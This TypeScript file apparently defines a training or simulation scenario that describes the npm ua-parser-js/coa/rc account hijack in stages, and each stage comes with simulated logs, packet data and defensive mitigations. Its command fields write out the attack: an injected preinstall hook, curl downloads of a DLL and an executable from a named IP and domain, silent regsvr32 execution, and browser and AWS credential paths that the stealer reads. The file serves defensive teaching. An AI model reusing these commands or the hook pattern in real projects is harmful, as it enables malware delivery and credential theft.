import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'npm-ua-parser-js-coa-rc-supply-chain',
    title: 'NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Threat actors compromise the npm maintainer accounts of ubiquitous JavaScript packages (ua-parser-js, coa, and rc) and inject malicious preinstall lifecycle hooks that execute compile.bat / sdd.dll via regsvr32.exe -s to deploy the DanaBot credential stealer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Hijacked NPM Account & Payload Server', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM Registry (ua-parser-js / coa / rc)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Developer Workstation (npm install)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Endpoint EDR & NPM Audit Guard', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Browser Session Vault & Cloud Tokens', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Maintainer Account Takeover & Malicious preinstall Hook Publish',
        narration:
          'Attackers compromise the npm registry credentials of maintainers lacking hardware 2FA and publish trojanized minor versions (ua-parser-js 0.7.29, coa 2.0.3, rc 1.2.9) containing a "preinstall": "node preinstall.js" lifecycle hook in package.json.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'package.json injection: "scripts": { "preinstall": "node preinstall.js" }',
          'npm publish ua-parser-js@0.7.29 / coa@2.0.3 / rc@1.2.9',
        ],
        defenseMitigation:
          'Commit lockfiles (package-lock.json / pnpm-lock.yaml), run npm ci --ignore-scripts in CI environments, and enforce WebAuthn 2FA for package publishing.',
        logs: [
          {
            id: 'npm-1',
            timestamp: '13:15:02.100',
            source: 'WAF',
            severity: 'critical',
            raw: 'NPM Registry Integrity Alert | Packages: ua-parser-js@0.7.29, coa@2.0.3, rc@1.2.9 | Anomaly: Newly added "preinstall" script invoking obfuscated compile.js / preinstall.js',
            parsedFields: {
              AffectedPackages: 'ua-parser-js (0.7.29), coa (2.0.3), rc (1.2.9)',
              InjectedLifecycleHook: 'scripts.preinstall -> node preinstall.js',
              WeeklyDownloadReach: '> 20 Million Combined Downloads/Week',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Automatic preinstall Execution & curl Download of sdd.dll',
        narration:
          'When a developer or build server runs npm install without a pinned lockfile, npm automatically executes preinstall.js, which spawns compile.bat to download a malicious payload (sdd.dll) from 159.148.186.228 and save it as create.dll.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Execution (T1059.007 - JavaScript / T1059.003 - Windows Command Shell)',
        technicalCommands: [
          'node preinstall.js -> spawns cmd.exe /c compile.bat',
          'curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && curl https://citationsheriff.com/sdd.dll -o create.dll',
        ],
        defenseMitigation:
          'Configure developer workstations with global npm config `ignore-scripts=true` and monitor node.exe spawning cmd.exe or powershell.exe during package installation.',
        logs: [
          {
            id: 'npm-2',
            timestamp: '13:18:40.512',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cmd.exe',
            CommandLine: 'cmd.exe /c compile.bat',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files\\nodejs\\node.exe | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: cmd.exe /c compile.bat | ChildCommand: curl https://citationsheriff.com/sdd.dll -o create.dll',
            parsedFields: {
              ParentProcess: 'node.exe (npm preinstall hook)',
              BatchDropper: 'compile.bat',
              DownloadedDll: 'sdd.dll -> saved as create.dll',
            },
          },
        ],
        packets: [
          {
            id: 'npm-pkt-1',
            timestamp: '13:18:40.900',
            protocol: 'HTTPS',
            sourceIp: '10.10.5.21',
            destIp: '159.148.186.228',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1460,
            hexDump: '47 45 54 20 2F 73 64 64 2E 64 6C 6C 20 48 54 54 50 2F 31 2E 31 0D 0A 4D 5A 90 00 03 00 00 00',
            decodedString: 'GET /sdd.dll HTTP/1.1 -> Returns PE32+ DLL (DanaBot Dropper create.dll)',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft',
        narration:
          'The batch script executes regsvr32.exe -s create.dll to silently run the DanaBot banking/infostealer DLL via system proxy execution, harvesting saved browser credentials, cookies, SSH keys, and cloud CLI tokens from the developer machine.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Defense Evasion & Credential Access (T1218.010 - Regsvr32 / T1555)',
        technicalCommands: [
          'regsvr32.exe -s create.dll',
          'DanaBot Stealer: Reads %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data & ~/.aws/credentials',
        ],
        defenseMitigation:
          'Block regsvr32.exe from loading unsigned DLLs located in user-writable project directories or node_modules folders via WDAC/AppLocker rules.',
        logs: [
          {
            id: 'npm-3',
            timestamp: '13:18:44.019',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'regsvr32.exe',
            CommandLine: 'regsvr32.exe -s create.dll',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\cmd.exe | Image: C:\\Windows\\System32\\regsvr32.exe | CommandLine: regsvr32.exe -s create.dll | Payload: DanaBot Credential Stealer',
            parsedFields: {
              SystemBinaryProxy: 'regsvr32.exe -s create.dll',
              MalwareFamily: 'DanaBot InfoStealer + XMRig (jsextension.exe)',
              TargetedAssets: 'Chrome Login Data, Cookies, AWS/Git Credentials',
              MitreTechnique: 'T1218.010 (System Binary Proxy Execution: Regsvr32)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
